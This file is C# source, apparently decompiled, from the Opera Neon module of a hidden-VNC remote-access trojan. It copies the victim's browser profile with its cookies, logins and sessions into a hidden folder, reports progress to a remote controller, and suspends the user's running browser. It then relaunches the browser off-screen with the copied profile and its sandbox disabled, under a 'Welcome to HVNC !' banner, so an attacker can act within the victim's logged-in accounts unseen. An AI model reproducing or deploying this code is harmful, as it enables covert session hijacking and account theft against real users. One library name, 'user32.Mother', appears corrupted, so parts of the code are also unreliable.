using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DLL.Functions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace DLL.Browser;

internal class OperaNeon
{
	public static string user = Environment.UserName;

	internal const short SWP_NOMOVE = 2;

	internal const short SWP_NOSIZE = 1;

	internal const short SWP_NOZORDER = 4;

	internal const int SWP_SHOWWINDOW = 64;

	[DllImport("user32.Mother")]
	public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

	public static void StartOperaNeon(bool duplicate)
	{
		string fileName = "C:\\Users\\" + OperaNeon.user + "\\AppData\\Local\\Opera Software\\Opera Neon\\Application\\neon.exe";
		try
		{
			if (Conversions.ToBoolean(Outils.IsFileOpen(new FileInfo(Interaction.Environ("localappdata") + "\\Opera Software\\Opera Neon\\ICARUS\\lockfile"))))
			{
				Outils.SendInformation(Outils.nstream, "25|Opera Neon has already been opened!");
				return;
			}
			if (duplicate)
			{
				Outils.SendInformation(Outils.nstream, "22|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\Opera Software\\Opera Neon\\User Data") / 1024.0 / 1024.0)));
				MonitorDirSize monitorDirSize = new MonitorDirSize();
				monitorDirSize.StartMonitoring(Interaction.Environ("localappdata") + "\\Opera Software\\Opera Neon\\ICARUS");
				try
				{
					Outils.a.FileSystem.CopyDirectory(Interaction.Environ("localappdata") + "\\Opera Software\\Opera Neon\\User Data", Interaction.Environ("localappdata") + "\\Opera Software\\Opera Neon\\ICARUS", overwrite: true);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				monitorDirSize.StopMonitoring();
				Outils.SendInformation(Outils.nstream, "998|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\Opera Software\\Opera Neon\\User Data") / 1024.0 / 1024.0)));
			}
			else
			{
				Outils.SendInformation(Outils.nstream, "888|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\Opera Software\\Opera Neon\\User Data") / 1024.0 / 1024.0)));
			}
			Process[] processesByName = Process.GetProcessesByName("neon");
			for (int i = 0; i < processesByName.Length; i++)
			{
				Outils.SuspendProcess(processesByName[i]);
			}
			Process.Start(fileName, "--user-data-dir=\"" + Interaction.Environ("localappdata") + "\\Opera Software\\Opera Neon\\ICARUS\" \"data:text/html,<center><title>Welcome to HVNC !</title><br><br><img src='https://i.ibb.co/RvwvG2z/icaruwsdr-athens.png'><br><h1><font color='white'>Welcome to HVNC !</font></h1></center>\" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle();
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			while (Outils.FindHandle("Welcome to HVNC !") == (IntPtr)0)
			{
				Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
				OperaNeon.SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
				Application.DoEvents();
				if (stopwatch.ElapsedMilliseconds >= 10000)
				{
					return;
				}
			}
			stopwatch.Stop();
			processesByName = Process.GetProcessesByName("neon");
			for (int i = 0; i < processesByName.Length; i++)
			{
				Outils.ResumeProcess(processesByName[i]);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
